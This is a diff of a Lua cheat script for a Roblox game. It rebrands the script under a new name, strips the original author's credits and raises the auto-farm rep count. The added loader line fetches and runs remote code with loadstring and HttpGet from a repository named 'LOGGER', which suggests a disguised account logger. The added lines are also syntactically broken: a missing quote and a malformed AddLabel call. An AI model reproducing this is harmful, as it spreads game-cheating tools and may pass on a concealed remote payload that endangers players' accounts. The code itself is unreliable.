@@ -1,15 +1,12 @@
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
--- Whitelist desativada - você pode usar o script livremente
-print("[SISTEMA] Whitelist desativada. Script carregado com sucesso para: " .. LocalPlayer.Name)
-
-local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/memejames/elerium-v2-ui-library//main/Library"))()
+local library = loadstring(game:HttpGet(https://raw.githubusercontent.com/ikkkL624/LOGGER/refs/heads/main/UiMonarca"))()
 
 local player = game.Players.LocalPlayer
 local displayName = player.DisplayName or player.Name
 
-local window = library:AddWindow("Toxic Paid V3 Rework | Bienvenido " .. displayName, {
+local window = library:AddWindow("Rudy Muck| Bienvenido " .. displayName, {
     main_color = Color3.fromRGB(0, 0, 0),
     min_size = Vector2.new(630, 900),
     can_resize = false,
@@ -21,13 +18,12 @@ local RunService = game:GetService("RunService")
 
 repeat task.wait() until LocalPlayer and LocalPlayer.Character
 
--- Variables globales compartidas
-_G.whitelistedPlayers = _G.whitelistedPlayers or {}
-_G.targetPlayer = _G.targetPlayer or ""
-
 -- Variables específicas del Killer Tab
 local spyTargetDropdownItems = {}
 local targetPlayerName = ""
+
+local Main = window:AddTab("Main")
+Main:AddLabel:("Gracias por apoyarme")
 
 local AutoFarm = window:AddTab("Farm OP")
 AutoFarm:Show()
@@ -37,7 +33,7 @@ AutoFarm:Show()
 getgenv()._AutoRepFarmEnabled = false  
 
 -- Switch en la librería
-AutoFarm:AddSwitch("Fuerza OP", function(state)
+AutoFarm:AddSwitch("Fast Farm", function(state)
     getgenv()._AutoRepFarmEnabled = state
     warn("[Auto Rep Farm] Estado cambiado a:", state and "ON" or "OFF")
 end)
@@ -53,7 +49,7 @@ local PET_NAME = "Swift Samurai"
 local ROCK_NAME = "Rock5M"
 local PROTEIN_EGG_NAME = "ProteinEgg"
 local PROTEIN_EGG_INTERVAL = 30 * 60
-local REPS_PER_CYCLE = 500
+local REPS_PER_CYCLE = 1800
 local REP_DELAY = 0.01
 local ROCK_INTERVAL = 1
 local MAX_PING = 500   -- si pasa esto, pausa
@@ -4877,13 +4873,3 @@ end)
 Gift:AddSwitch("Auto Clear Inventory", function(state)
     autoEatBoostsEnabled = state
 end)
-
-
-
-local Credits = window:AddTab("Credits")
-
-Credits:AddLabel("Toxic Paid V3")
-Credits:AddLabel("Script Hecho por: Rafael")
-Credits:AddLabel("Tiktok:DeathKiller")
-Credits:AddLabel("MVX ON TOP 🔥")
-Credits:AddLabel("JASSON MI VIEJA")
